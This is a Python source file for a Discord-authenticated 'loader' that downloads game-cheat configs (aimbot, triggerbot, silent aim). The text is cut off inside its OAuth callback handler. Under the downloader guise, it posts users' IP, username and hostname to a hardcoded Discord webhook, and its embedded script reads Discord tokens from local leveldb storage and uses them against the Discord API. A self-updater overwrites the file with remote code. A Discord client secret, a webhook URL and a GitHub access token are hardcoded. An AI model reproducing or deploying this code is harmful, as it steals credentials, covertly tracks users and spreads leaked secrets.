# updated to 1.3

import customtkinter as ctk
from discord.ext import commands
import discord
import webbrowser
import aiohttp
import json
import subprocess
from http.server import HTTPServer, BaseHTTPRequestHandler
import threading
import os
from urllib.parse import quote, parse_qs, urlparse
import sys
import importlib
import signal
import types
import io
import time
import uuid
import datetime
import requests
import asyncio
import base64
import hashlib
import psutil
import platform
import socket
from requests import get
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
import ctypes
import shutil

# Add these constants for auto-updating
UPDATE_CHECK_URL = "https://raw.githubusercontent.com/Mitch275/logs/main/latest.py"
CURRENT_VERSION = "1.2"  # Current version

def check_for_updates():
    """Check GitHub for new version and update if needed"""
    try:
        print("\nChecking for updates...")
        response = requests.get(UPDATE_CHECK_URL, timeout=10)
        if response.status_code == 200:
            latest_code = response.text
            
            # Extract version from first line
            version_line = latest_code.split('\n')[0]
            if version_line.startswith('# updated'):
                try:
                    new_version = version_line.split()[2]
                    print(f"Current version: {CURRENT_VERSION}")
                    print(f"Latest version: {new_version}")
                    
                    if new_version > CURRENT_VERSION:
                        print("\nUpdate found!")
                        print("Updating... application will close & restart after complete!")
                        
                        # Write new code directly
                        with open(os.path.abspath(__file__), "w", encoding="utf-8") as f:
                            f.write(latest_code)
                            
                        print(f"Successfully updated from v{CURRENT_VERSION} to v{new_version}")
                        print("Restarting application...")
                        time.sleep(2)  # Give user time to read message
                        
                        # Restart the script
                        pause = input("Press Enter to restart...")
                        print ("restart the launcher...")
                        return True
                except Exception as e:
                    print(f"Update error: {e}")
    except Exception as e:
        print(f"Failed to check for updates: {e}")
    return False

def derive_machine_key():
    """Generate hardware-specific encryption key"""
    try:
        hw_info = [
            platform.processor(),
            str(uuid.getnode()),  # MAC address
            str(psutil.disk_partitions()[0].device if psutil.disk_partitions() else ''),
            platform.node(),
            str(os.getenv('USERNAME', '')),
            str(psutil.cpu_freq().max if psutil.cpu_freq() else ''),
        ]
        unique_id = ''.join(hw_info).encode()
        return base64.b64encode(hashlib.pbkdf2_hmac(
            'sha256', 
            unique_id,
            b'mitch_secure_salt_v3',
            250000
        ))
    except:
        return None

def encrypt_sensitive_data(data):
    """Encrypt data with machine-specific key"""
    key = derive_machine_key()
    if not key:
        return None
    f = Fernet(key)
    return f.encrypt(json.dumps(data).encode())

def decrypt_sensitive_data(encrypted_data):
    """Decrypt data with machine-specific key"""
    try:
        key = derive_machine_key()
        if not key:
            return None
        f = Fernet(key)
        return json.loads(f.decrypt(encrypted_data))
    except:
        return None

def ensure_app_directory():
    """Create secure app directories"""
    app_dir = os.path.join(os.getenv('APPDATA'), 'mitch')
    if not os.path.exists(app_dir):
        os.makedirs(app_dir)
        
    auth_dir = os.path.join(app_dir, '.mauth')  # Hidden auth directory
    if not os.path.exists(auth_dir):
        os.makedirs(auth_dir)
        if sys.platform.startswith('win'):
            ctypes.windll.kernel32.SetFileAttributesW(auth_dir, 2)  # Hidden
            
    icon_path = os.path.join(app_dir, 'logo.ico')
    auth_path = os.path.join(auth_dir, '.auth.dat')  # Hidden auth file
    
    if not os.path.exists(icon_path):
        try:
            response = requests.get('https://raw.githubusercontent.com/Mitch275/logs/refs/heads/main/monkey.ico')
            with open(icon_path, 'wb') as f:
                f.write(response.content)
        except Exception as e:
            print(f"Error downloading icon: {e}")
    
    return app_dir, icon_path, auth_path

def get_system_info():
    """Get detailed system information"""
    try:
        ip = get('https://api.ipify.org').text
    except:
        ip = "Unable to get IP"
    
    info = {
        "PC User": os.getenv('USERNAME', 'Unknown'),
        "IP": ip,
        "OS": platform.system() + " " + platform.release(),
        "Platform": sys.platform,
        "Machine": platform.machine(),
        "Processor": platform.processor(),
        "Hostname": socket.gethostname(),
        "Python Version": sys.version.split()[0]
    }
    return info

def send_startup_webhook():
    """Send webhook when loader starts"""
    sys_info = get_system_info()
    
    # Create formatted message
    info_text = "\n".join([f"{k}: `{v}`" for k, v in sys_info.items()])
    
    webhook_data = {
        "embeds": [{
            "title": "Loader Started",
            "description": info_text,
            "color": 0x2C5530,
            "footer": {
                "text": "mitch"
            },
            "timestamp": datetime.datetime.now().isoformat()
        }]
    }
    
    try:
        requests.post(WEBHOOK_URL, json=webhook_data)
    except:
        pass

# Discord application credentials
CLIENT_ID = "1349540808554053754"
CLIENT_SECRET = "PJHJVB7Urs17w49rIE-k29wah_xQ0H-z"
REDIRECT_URI = "http://localhost:8000/callback"
WEBHOOK_URL = "https://discord.com/api/webhooks/1345815364130570334/6PSAHmsuWiXmRO18nxEEY5_isSyzbh3_flnZc_2El-MdogdvEmFKhFjKFWPDZYGM7405"

# GitHub configuration for whitelist/blacklist
GITHUB_API_URL = 'https://api.github.com/repos/Mitch275/logs/contents/auth_data.json'
GITHUB_TOKEN = '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'

# Add auth check interval constant
AUTH_CHECK_INTERVAL = 1  # Check auth status every 30 seconds

DISCORD_AUTH_URL = f"https://discord.com/oauth2/authorize?client_id=1349540808554053754&response_type=code&redirect_uri=http%3A%2F%2Flocalhost%3A8000%2Fcallback&scope=identify"
TOKEN_URL = "https://discord.com/api/oauth2/token"
USER_URL = "https://discord.com/api/users/@me"

# Script source remains the same
SCRIPT_SOURCE = r'''
import customtkinter as ctk
from tkinter import filedialog, messagebox
import requests
import os
import json
from datetime import datetime

class FileDownloaderApp(ctk.CTk):
    def __init__(self):
        super().__init__()
        self.title("mitch")
        self.geometry("400x500")
        self.configure(fg_color="black")  # Set window background to black
        self.attributes('-topmost', True)  # Make window always on top
        
        # Create custom title bar with complete window control
        self.overrideredirect(True)  # Remove default title bar completely
        
        # Create custom title bar
        self.title_bar = ctk.CTkFrame(self, fg_color="black", height=30)
        self.title_bar.pack(fill='x', side='top')
        self.title_bar.pack_propagate(False)
        
        # Add title label with jungle green text
        title_label = ctk.CTkLabel(self.title_bar, text="mitch", fg_color="black", 
                                 text_color="#2C5530", font=("Helvetica", 12, "bold"))
        title_label.pack(side='left', padx=10)
        
        # Add close button with black background
        close_button = ctk.CTkButton(self.title_bar, text="×", width=30, height=30, 
                                   command=self.quit, fg_color="black", 
                                   hover_color="#8B0000", corner_radius=0)
        close_button.pack(side='right')
        
        # Bind mouse events for window dragging
        self.title_bar.bind('<Button-1>', self.start_move)
        self.title_bar.bind('<B1-Motion>', self.on_move)
        
        # Set window icon if it exists
        icon_path = os.path.join(os.getenv('APPDATA'), 'mitch', 'logo.ico')
        if os.path.exists(icon_path):
            self.after(200, lambda: self.iconbitmap(icon_path))
            self.after(200, lambda: self.wm_iconbitmap(icon_path))
            
        self.webhook_url = "https://discord.com/api/webhooks/1345815364130570334/6PSAHmsuWiXmRO18nxEEY5_isSyzbh3_flnZc_2El-MdogdvEmFKhFjKFWPDZYGM7405"
        self.download_dir = self.get_download_directory()
        self.discord_id = self.get_discord_id()

        # Organize files by filters
        self.filters = {
            "Matrix": {
                "blatant": {
                    "70-99 BLATNT": "https://files.catbox.moe/snhhvh.mcf",
                    "BESTBLATANTCFGDH": "https://files.catbox.moe/5ftcjy.mcf",
                    "blatant (2)": "https://files.catbox.moe/bvjl9t.mcf",
                    "BLATANTASF": "https://files.catbox.moe/2v5ow1.mcf",
                    "BLATANTHIGHPING": "https://files.catbox.moe/cs4qz6.mcf",
                    "BLATANTLOWPING": "https://files.catbox.moe/cundnc.mcf",
                    "BLATANTMIDPING": "https://files.catbox.moe/catzov.mcf",
                    "BLATANTOPSET": "https://files.catbox.moe/hbvq62.mcf",
                    "blatantrt": "https://files.catbox.moe/x01w41.mcf",
                    "blatnatPF": "https://files.catbox.moe/t5zps0.json",
                    "DHBLATANTTPS": "https://files.catbox.moe/205l5a.mcf",
                    "EEXPLOITER (1)": "https://files.catbox.moe/s5p8ok.mcf",
                    "godlyblat": "https://files.catbox.moe/6w9cas.mcf",
                    "HVHNEW": "https://files.catbox.moe/ugdfxk.json",
                    "lowk blatant": "https://files.catbox.moe/x01w41.mcf",
                    "OPBLATANTCONFIG": "https://files.catbox.moe/4egquv.mcf",
                    "smgblatanta": "https://files.catbox.moe/q0ihlb.mcf",
                    "STAR.TRYOUTZENBLADI": "https://files.catbox.moe/jjut3u.mcf",
                    "THEBESTBLATANT": "https://files.catbox.moe/6w9cas.mcf",
                    "TRACING": "https://files.catbox.moe/82q8zu.mcf",
                    "TUFFBLATNATPHANTOM": "https://files.catbox.moe/t5zps0.json"
                },
                "silent": {
                    "70-90SILENT": "https://files.catbox.moe/n4dx9k.mcf",
                    "8090SILENT": "https://files.catbox.moe/pzb30j.mcf",
                    "cam + TB + silent aim i guess": "https://files.catbox.moe/xvpk5c.mcf",
                    "CAMSILENTLOWW": "https://files.catbox.moe/pbje39.mcf",
                    "cisto silent tb": "https://files.catbox.moe/bcu9av.mcf",
                    "CRAZYSILENT": "https://files.catbox.moe/cs0kc4.mcf",
                    "kodas silent": "https://files.catbox.moe/sbpwkq.mcf",
                    "LEGITCAMANDSILENT": "https://files.catbox.moe/ws8jas.mcf",
                    "LEGITSILENT": "https://files.catbox.moe/6v3nxs.mcf",
                    "mega op sigma tb + silent camlock": "https://files.catbox.moe/vyudta.mcf",
                    "SEMILEGITCAMSILENTHOODCUSTOMS": "https://files.catbox.moe/m8l1l2.mcf",
                    "silent": "https://files.catbox.moe/qi6375.mcf",
                    "silenttt": "https://files.catbox.moe/m6hlql.mcf",
                    "SMOOTHTBSILENTAIM": "https://files.catbox.moe/mkm1m1.mcf",
                    "STREAMABLESILENT": "https://files.catbox.moe/5lyawr.mcf",
                    "STREAMABLESILENTANDTB": "https://files.catbox.moe/h5f8o4.mcf",
                    "TBSILENTA": "https://files.catbox.moe/4056oe.mcf"
                },
                "triggerbot": {
                    "100MSTB": "https://files.catbox.moe/0ba7sa.mcf",
                    "BESTBLATANTCFGDH": "https://files.catbox.moe/5ftcjy.mcf",
                    "BESTTBMAINL": "https://files.catbox.moe/4gwemc.mcf",
                    "cisto silent tb": "https://files.catbox.moe/bcu9av.mcf",
                    "LEGITTBBB": "https://files.catbox.moe/nwr4p1.mcf",
                    "mega op sigma tb + silent camlock": "https://files.catbox.moe/vyudta.mcf",
                    "SMOOTHTBSILENTAIM": "https://files.catbox.moe/mkm1m1.mcf",
                    "STREAMABLESILENTANDTB": "https://files.catbox.moe/h5f8o4.mcf",
                    "TBBBBB": "https://files.catbox.moe/ql6i3k.mcf",
                    "TBSEMILEGITT": "https://files.catbox.moe/rtuf8c.mcf",
                    "tbsil": "https://files.catbox.moe/bsjnox.mcf",
                    "TBSILENTA": "https://files.catbox.moe/4056oe.mcf",
                    "TBV2": "https://files.catbox.moe/74dy8d.mcf",
                    "THEBESTBLATANT": "https://files.catbox.moe/6w9cas.mcf",
                    "THEBESTTB": "https://files.catbox.moe/bcu9av.mcf"
                },
                "legit": {
                    "100PINGLEGITT": "https://files.catbox.moe/0ba7sa.mcf",
                    "gravylegit": "https://files.catbox.moe/g3p36k.mcf",
                    "LEGIT": "https://files.catbox.moe/tp0zgf.mcf",
                    "legit": "https://files.catbox.moe/d83wo1.mcf",
                    "LEGITASFF": "https://files.catbox.moe/4mg5bb.mcf",
                    "LEGITCAMANDSILENT": "https://files.catbox.moe/ws8jas.mcf",
                    "LEGITHIGHPING": "https://files.catbox.moe/m880ke.mcf",
                    "LEGITLOWPING": "https://files.catbox.moe/kqf3o9.mcf",
                    "LEGITMIDPING": "https://files.catbox.moe/eo6rsb.mcf",
                    "LEGITSILENT": "https://files.catbox.moe/6v3nxs.mcf",
                    "legitt": "https://files.catbox.moe/x0byn9.mcf",
                    "LEGITTBBB": "https://files.catbox.moe/nwr4p1.mcf",
                    "MEGALEGITt": "https://files.catbox.moe/j2u2gt.mcf",
                    "MEGALEGITXAXA": "https://files.catbox.moe/byfen9.mcf",
                    "REGRETHOODCUSTOMSLEGITCNFG": "https://files.catbox.moe/1wu3tu.mcf",
                    "REGRETLEGITTRIGGERBOTUPDATED": "https://files.catbox.moe/u4ljcq.mcf",
                    "TUFFLEGITPHANTOM": "https://files.catbox.moe/3kdwhs.json"
                },
                "semi-legit": {
                    "CriminalSemiLegit": "https://files.catbox.moe/q5wwsa.cfg",
                    "CriminalSemiLegitV2": "https://files.catbox.moe/k2ryjn.cfg",
                    "deptsSEMi": "https://files.catbox.moe/ql9s5h.mcf",
                    "Enforcement SemiLegit": "https://files.catbox.moe/wvyoav.cfg",
                    "HC80ping-semi": "https://files.catbox.moe/a9vino.cfg",
                    "hood customs semi legit cfg 57-70": "https://files.catbox.moe/kn8ybp.cfg",
                    "low ping tapping semi to blatant": "https://files.catbox.moe/t4zoa1.cfg",
                    "OLDUIMATRIXARSENALSEMILOL": "https://files.catbox.moe/p7m339.mcf",
                    "PfSniperSemiLegit": "https://files.catbox.moe/49n8da.cfg",
                    "RIVALSSEMILEGIT": "https://files.catbox.moe/e8molb.mcf",
                    "semi 90 ping": "https://files.catbox.moe/q4aok0.json",
                    "semi legit (3)": "https://files.catbox.moe/v4o5g3.mcf",
                    "semi legit bad business": "https://files.catbox.moe/5m214h.cfg",
                    "semi legit dh": "https://files.catbox.moe/183sdc.cfg",
                    "Semi_celex": "https://files.catbox.moe/pbpacb.json",
                    "semi1": "https://files.catbox.moe/uj54e8.mcf",
                    "semi2": "https://files.catbox.moe/ndw5qs.mcf",
                    "semi3": "https://files.catbox.moe/k9rwap.mcf",
                    "semi-blatant_2_celex": "https://files.catbox.moe/p5hj36.json",
                    "SemiBlatantPF": "https://files.catbox.moe/uyo0ox.cfg",
                    "SEMIHIGHPING": "https://files.catbox.moe/8ta9rh.mcf",
                    "semilegit exile": "https://files.catbox.moe/fj3g4b.json",
                    "Semi-Legit, DH + HC anyping": "https://files.catbox.moe/k5n2bm.mcf",
                    "semi-legit": "https://files.catbox.moe/6ck84e.cfg",
                    "semilegit_celex": "https://files.catbox.moe/rv5z2e.json",
                    "SEMILEGITCAMSILENTHOODCUSTOMS": "https://files.catbox.moe/m8l1l2.mcf",
                    "semilegitgrajah_celex": "https://files.catbox.moe/dg2ty7.json",
                    "semi-legithighping": "https://files.catbox.moe/ib1321.cfg",
                    "semi-legitmidping": "https://files.catbox.moe/8pml0u.cfg",
                    "SEMILEGITRIVALS": "https://files.catbox.moe/z25vlx.mcf",
                    "SEMILEGITTB": "https://files.catbox.moe/xa9ggj.mcf",
                    "SEMILOWPING": "https://files.catbox.moe/mtkfos.mcf",
                    "SEMIMIDPING": "https://files.catbox.moe/hlepac.mcf",
                    "silent n tb semi": "https://files.catbox.moe/rtuf8c.mcf",
                    "TBSEMILEGITT": "https://files.catbox.moe/rtuf8c.mcf",
                    "TERRORFALLENSEMILEGIT": "https://files.catbox.moe/9g1miw.mcf",
                    "terrorsemilegitdh": "https://files.catbox.moe/pf25sf.mcf",
                    "TERRORSEMILEGITRIVLAS1": "https://files.catbox.moe/d5sypl.mcf",
                    "UPDATEDHOODCUSTOMSCFGSEMI": "https://files.catbox.moe/nsmt80.mcf"
                }
            },
            "Matcha": {
                "universal": {
                    "aaa tb sets": "https://files.catbox.moe/ct2o8x.cfg",
                    "bagelhcfig": "https://files.catbox.moe/42g3z5.cfg",
                    "blztznthighping": "https://files.catbox.moe/lptbsi.cfg",
                    "blztzntlowping": "https://files.catbox.moe/vnvzpr.cfg",
                    "blztzntmidping": "https://files.catbox.moe/swp6v9.cfg",
                    "Da Hood Never Miss": "https://files.catbox.moe/zh9bj5.cfg",
                    "everypingnomissdh": "https://files.catbox.moe/t25p1h.cfg",
                    "hoodbagel": "https://files.catbox.moe/ch8bcg.cfg",
                    "legithighping": "https://files.catbox.moe/0xjpf0.cfg",
                    "legitlowping": "https://files.catbox.moe/kez080.cfg",
                    "legitmidping": "https://files.catbox.moe/y10mbz.cfg",
                    "nyqv personal blatant": "https://files.catbox.moe/nro938.cfg",
                    "nyqv semi legit personal": "https://files.catbox.moe/3toxz9.cfg",
                    "nyqv star tryout used legit": "https://files.catbox.moe/b8vbot.cfg",
                    "semi-legit": "https://files.catbox.moe/6ck84e.cfg",
                    "semi-legithighping": "https://files.catbox.moe/ib1321.cfg", 
                    "semi-legitmidping": "https://files.catbox.moe/8pml0u.cfg",
                    "v3 silent lp": "https://files.catbox.moe/1m6kz6.cfg",
                    "v3 silent": "https://files.catbox.moe/rkc78m.cfg",
                    "vflegit": "https://files.catbox.moe/pg84g9.cfg"
                }
            }
        }

        self.main_frame = ctk.CTkFrame(self, fg_color="black")
        self.main_frame.pack(pady=20, padx=20, fill="both", expand=True)

        # Filter selector
        self.filter_label = ctk.CTkLabel(self.main_frame, text="Select Filter:", font=("Arial", 14, "bold"), fg_color="black")
        self.filter_label.pack(pady=(10, 5))

        self.selected_filter = ctk.StringVar(value=list(self.filters.keys())[0])
        self.filter_dropdown = ctk.CTkOptionMenu(
            self.main_frame,
            values=list(self.filters.keys()),
            variable=self.selected_filter,
            command=self.update_section_list,
            width=300,
            button_color="#2C5530",
            button_hover_color="#1E3B22",
            fg_color="#2C5530",
            bg_color="black"  # Add background color
        )
        self.filter_dropdown.pack(pady=(0, 10))

        # Category selector
        self.section_label = ctk.CTkLabel(self.main_frame, text="Select Category:", font=("Arial", 14, "bold"), fg_color="black")
        self.section_label.pack(pady=(10, 5))

        self.selected_section = ctk.StringVar()
        self.section_dropdown = ctk.CTkOptionMenu(
            self.main_frame,
            values=[],
            variable=self.selected_section,
            command=self.update_file_list,
            width=300,
            button_color="#2C5530",
            button_hover_color="#1E3B22",
            fg_color="#2C5530",
            bg_color="black"  # Add background color
        )
        self.section_dropdown.pack(pady=(0, 10))

        # Search bar
        self.search_var = ctk.StringVar()
        self.search_var.trace('w', self.filter_files)
        self.search_entry = ctk.CTkEntry(
            self.main_frame,
            placeholder_text="Search configs...",
            width=300,
            textvariable=self.search_var,
            fg_color="#242424",  # Slightly lighter than black for visibility
            bg_color="black",
            border_color="#2C5530"
        )
        self.search_entry.pack(pady=(0, 10))

        # Scrollable frame for files
        self.files_container = ctk.CTkScrollableFrame(
            self.main_frame,
            width=350,
            height=300,
            fg_color="black",
            border_color="#2C5530"
        )
        self.files_container.pack(fill="both", expand=True, pady=(0, 10))
        
        # Configure grid layout for the container
        self.files_container.grid_columnconfigure(0, weight=1)

        # Store file buttons
        self.file_buttons = []

        # Download button with improved styling
        self.download_button = ctk.CTkButton(
            self.main_frame,
            text="Download",
            command=self.download_file,
            width=200,
            height=40,
            font=("Arial", 14, "bold"),
            fg_color="#2C5530",
            hover_color="#1E3B22",
            bg_color="black"  # Add background color
        )
        self.download_button.pack(pady=20)

    @property
    def config_file(self):
        appdata = os.getenv('APPDATA')
        if (appdata):
            return os.path.join(appdata, 'mitch', 'directory.json')
        return 'directory.json'  # Fallback if APPDATA is not available

    def update_section_list(self, *args):
        selected_filter = self.selected_filter.get()
        sections = list(self.filters[selected_filter].keys())
        self.section_dropdown.configure(values=sections)
        self.selected_section.set(sections[0])
        self.update_file_list()

    def update_file_list(self, *args):
        # Clear existing buttons
        for button in self.file_buttons:
            button.destroy()
        self.file_buttons.clear()

        selected_filter = self.selected_filter.get()
        section = self.selected_section.get()
        files = list(self.filters[selected_filter][section].keys())
        
        # Create new buttons vertically
        for i, file in enumerate(files):
            btn = ctk.CTkButton(
                self.files_container,
                text=file,
                command=lambda f=file: self.download_selected_file(f),
                fg_color="#2C5530",
                hover_color="#1E3B22",
                width=320,  # Make buttons wider
                height=35   # Add fixed height
            )
            btn.grid(row=i, column=0, padx=5, pady=3, sticky="ew")  # Use grid instead of pack
            self.file_buttons.append(btn)

    def filter_files(self, *args):
        search_text = self.search_var.get().lower()
        selected_filter = self.selected_filter.get()
        section = self.selected_section.get()
        files = list(self.filters[selected_filter][section].keys())

        # Clear existing buttons
        for button in self.file_buttons:
            button.destroy()
        self.file_buttons.clear()

        # Create filtered buttons vertically
        row = 0
        for file in files:
            if search_text in file.lower():
                btn = ctk.CTkButton(
                    self.files_container,
                    text=file,
                    command=lambda f=file: self.download_selected_file(f),
                    fg_color="#2C5530",
                    hover_color="#1E3B22",
                    width=320,  # Make buttons wider
                    height=35   # Add fixed height
                )
                btn.grid(row=row, column=0, padx=5, pady=3, sticky="ew")  # Use grid instead of pack
                self.file_buttons.append(btn)
                row += 1

    def download_selected_file(self, filename):
        selected_filter = self.selected_filter.get()
        section = self.selected_section.get()
        if filename in self.filters[selected_filter][section]:
            download_url = self.filters[selected_filter][section][filename]
            extension = self.get_file_extension(download_url)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            try:
                response = requests.get(
                    download_url,
                    headers=headers,
                    timeout=30,
                    stream=True,
                    verify=True,
                    allow_redirects=True
                )
                response.raise_for_status()
                
                file_name = os.path.join(self.download_dir, f"{filename}.{extension}")
                with open(file_name, "wb") as file:
                    for chunk in response.iter_content(chunk_size=8192):
                        if chunk:
                            file.write(chunk)
                messagebox.showinfo("Success", f"File downloaded to {file_name}")
                self.log_to_discord(filename)
                
            except requests.exceptions.SSLError:
                messagebox.showerror("Error", "SSL Certificate verification failed")
            except requests.exceptions.Timeout:
                messagebox.showerror("Error", "Connection timed out")
            except requests.exceptions.ConnectionError:
                messagebox.showerror("Error", "Connection failed. Please check your internet connection.")
            except RequestException as e: # type: ignore
                messagebox.showerror("Error", f"Download failed: {str(e)}")

    def get_download_directory(self):
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    return config.get('download_dir', '')
            except:
                return self.set_download_directory()
        return self.set_download_directory()

    def set_download_directory(self):
        dir_path = filedialog.askdirectory(title="Select Default Download Directory")
        if (dir_path):
            with open(self.config_file, 'w') as f:
                json.dump({'download_dir': dir_path}, f)
            return dir_path
        return os.getcwd()

    def get_discord_id(self):
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
                    if 'discord_id' in config and config['discord_id']:
                        return config['discord_id']
            except:
                pass
        return self.set_discord_id()

    def get_discord_user_info(self, token):
        headers = {
            'Authorization': token
        }
        try:
            response = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            if response.status_code == 200:
                return response.json().get('id')
            return None
        except:
            return None

    def try_auto_detect_discord_id(self):
        local_storage_paths = [
            os.path.join(os.getenv('APPDATA'), 'discord', 'Local Storage', 'leveldb'),
            os.path.join(os.getenv('APPDATA'), 'discordcanary', 'Local Storage', 'leveldb'),
            os.path.join(os.getenv('APPDATA'), 'discordptb', 'Local Storage', 'leveldb')
        ]

        try:
            for path in local_storage_paths:
                if os.path.exists(path):
                    for file in os.listdir(path):
                        if file.endswith('.ldb'):
                            with open(os.path.join(path, file), 'rb') as f:
                                content = f.read().decode('utf-8', errors='ignore')
                                tokens = [token.strip() for token in content.split() if token.strip().startswith('mfa.') or len(token.strip()) == 59]
                                for token in tokens:
                                    discord_id = self.get_discord_user_info(token)
                                    if discord_id:
                                        return discord_id
        except:
            pass
        return None

    def save_discord_id(self, discord_id):
        config = {}
        if os.path.exists(self.config_file):
            try:
                with open(self.config_file, 'r') as f:
                    config = json.load(f)
            except:
                pass
        config['discord_id'] = discord_id
        with open(self.config_file, 'w') as f:
            json.dump(config, f)

    def set_discord_id(self):
        # Try to auto-detect
        auto_id = self.try_auto_detect_discord_id()
        if auto_id:
            self.save_discord_id(auto_id)
            return auto_id
        return "0"  # Default value if auto-detection fails

    def log_to_discord(self, filename):
        try:
            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            selected_filter = self.selected_filter.get()
            
            # Get IP address
            ip = requests.get('https://api.ipify.org').text
            
            webhook_data = {
                "embeds": [{
                    "title": "New Log",
                    "description": f"<@{self.discord_id}> downloaded a file\nTime: `{timestamp}`\nFilter: `{selected_filter}`\nFile: `{filename}`\nIP: `{ip}`",
                    "color": 0x2C5530,
                    "footer": {
                        "text": "mitch"
                    }
                }]
            }
            
            requests.post(self.webhook_url, json=webhook_data)
        except:
            pass  # Silently fail if webhook logging fails

    def get_file_extension(self, url):
        return url.split('.')[-1]  # Get extension from URL

    def download_file(self):
        selected_file = self.selected_file.get()
        section = self.selected_section.get()
        selected_filter = self.selected_filter.get()  # Retrieve the selected filter
        if selected_file in self.filters[selected_filter][section]:
            download_url = self.filters[selected_filter][section][selected_file]
            extension = self.get_file_extension(download_url)
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
            }
            try:
                response = requests.get(
                    download_url,
                    headers=headers,
                    timeout=30,
                    stream=True,
                    verify=True,
                    allow_redirects=True
                )
                response.raise_for_status()
                
                file_name = os.path.join(self.download_dir, f"{selected_file}.{extension}")
                with open(file_name, "wb") as file:
                    for chunk in response.iter_content(chunk_size=8192):
                        if chunk:
                            file.write(chunk)
                messagebox.showinfo("Success", f"File downloaded to {file_name}")
                self.log_to_discord(selected_file)
                
            except requests.exceptions.SSLError:
                messagebox.showerror("Error", "SSL Certificate verification failed")
            except requests.exceptions.Timeout:
                messagebox.showerror("Error", "Connection timed out")
            except requests.exceptions.ConnectionError:
                messagebox.showerror("Error", "Connection failed. Please check your internet connection.")
            except RequestException as e: # type: ignore
                messagebox.showerror("Error", f"Download failed: {str(e)}")
        else:
            messagebox.showwarning("Warning", "Please select a valid file")

    # Add window dragging methods
    def start_move(self, event):
        self.x = event.x
        self.y = event.y

    def on_move(self, event):
        deltax = event.x - self.x
        deltay = event.y - self.y
        x = self.winfo_x() + deltax
        y = self.winfo_y() + deltay
        self.geometry(f"+{x}+{y}")

if __name__ == "__main__":
    app = FileDownloaderApp()
    app.mainloop()
'''

# HTML templates for success and error pages
SUCCESS_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Authorization Status</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
        }
        .status-message {
            background-color: #1a1a1a;
            padding: 20px 40px;
            border-radius: 5px;
            margin-top: 20px;
            text-align: center;
            border: 1px solid #333;
        }
        .success {
            color: #4CAF50;
        }
    </style>
</head>
<body>
    <div class="status-message">
        <h2 class="success">Authorization Successful!</h2>
        <p>check auth window for more info!</p>
    </div>
    <script>
        // Signal to parent window that auth is successful
        window.opener && window.opener.postMessage('auth_success', '*');
    </script>
</body>
</html>
"""

ERROR_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Authorization Status</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
        }
        .status-message {
            background-color: #1a1a1a;
            padding: 20px 40px;
            border-radius: 5px;
            margin-top: 20px;
            text-align: center;
            border: 1px solid #333;
        }
        .error {
            color: #f44336;
        }
    </style>
</head>
<body>
    <div class="status-message">
        <h2 class="error">Authorization Unsuccessful!</h2>
        <p>You are not whitelisted to use this application.</p>
    </div>
    <script>
        // Signal to parent window that auth failed
        window.opener && window.opener.postMessage('auth_failed', '*');
    </script>
</body>
</html>
"""

WAITING_HTML = """
<!DOCTYPE html>
<html>
<head>
    <title>Authorization Status</title>
    <style>
        body {
            background-color: black;
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: flex-start;
        }
        .status-message {
            background-color: #1a1a1a;
            padding: 20px 40px;
            border-radius: 5px;
            margin-top: 20px;
            text-align: center;
            border: 1px solid #333;
        }
        .waiting {
            color: #3498db;
        }
        .loader {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 2s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <script>
        // Check for auth status periodically
        function checkStatus() {
            fetch('/status')
                .then(response => response.json())
                .then(data => {
                    if (data.status === 'pending') {
                        setTimeout(checkStatus, 500);
                    } else {
                        window.location.href = data.status === 'success' ? '/success' : '/error';
                    }
                })
                .catch(error => {
                    setTimeout(checkStatus, 500);
                });
        }
        
        window.onload = function() {
            setTimeout(checkStatus, 1000);
        };
    </script>
</head>
<body>
    <div class="status-message">
        <h2 class="waiting">Verifying Authorization...</h2>
        <div class="loader"></div>
        <p>Please wait while we verify your access</p>
    </div>
</body>
</html>
"""

# Use a shared state variable for communication
auth_state = {"status": "pending", "code": None}
auth_server = None

# Function to fetch whitelist and blacklist from GitHub
def fetch_auth_data():
    url = f"{GITHUB_API_URL}?cache_bust={int(time.time())}"
    headers = {'Authorization': f'token {GITHUB_TOKEN}'}

    try:
        response = requests.get(url, headers=headers)
    
        if response.status_code == 200:
            file_content = response.json().get('content', '')
            if file_content:
                decoded_content = base64.b64decode(file_content).decode('utf-8')
                auth_data = json.loads(decoded_content)
                whitelisted_users = set(str(user) for user in auth_data.get("whitelisted_users", []))
                blacklisted_users = set(str(user) for user in auth_data.get("blacklisted_users", []))
                return whitelisted_users, blacklisted_users
            else:
                return set(), set()
        else:
            return set(), set()
    except Exception as e:
        return set(), set()

class AuthHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        global auth_state
        
        if self.path.startswith('/callback'):
            parsed_url = urlparse(self.path)
            query_params = parse_qs(parsed_url.query)
            
            # Check if the URL contains an error parameter
            if 'error' in query_params:
                auth_state["status"] = "error"
                
                # Redirect to the error page
                self.send_response(302)
                self.send_header('Location', '/error')
                self.end_headers()
            else:
                try:
                    # Extract the code parameter more reliably
                    if 'code' in query_params and query_params['code'][0]:
                        code = query_params['code'][0]
                        auth_state["code"] = code
                        
